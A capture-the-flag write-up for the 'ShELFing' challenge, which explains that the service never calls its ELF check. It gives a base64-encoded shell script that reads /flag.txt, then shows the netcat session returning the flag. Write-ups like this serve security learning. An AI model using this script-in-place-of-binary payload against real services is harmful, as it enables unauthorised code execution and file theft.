# Challenge ShELFing

<https://quals.brics-ctf.ru/scoreboard>

There is a container: nc 89.169.156.185 10385
And shelfing.tar.gz is attached

## Analysis

./service/server.py there is No ELF Validation: The checkElf function in server.py is defined but never called. 
Therefore, any data we provide will be written to a file and executed, regardless of whether it's a valid ELF binary.
Execution of Scripts: The os.execve function can execute scripts if they start with a shebang (#!) line, as per Unix conventions.
Size Constraints: The script we provide must be less than or equal to 76 bytes when base64-decoded.

./service/Dockerfile point to a flag.txt file
we would need to cat the content of the file...

## FLAG

```bash
python gen.py
IyEvYmluL3NoCmNhdCAvZmxhZy50eHQK
```

```bash
└─$ nc 89.169.156.185 10385
[?] Enter base64 encoded ELF x64 executable: IyEvYmluL3NoCmNhdCAvZmxhZy50eHQK
brics+{c28b7e88-ab2e-41a6-9763-3d39f1a4de16}
```
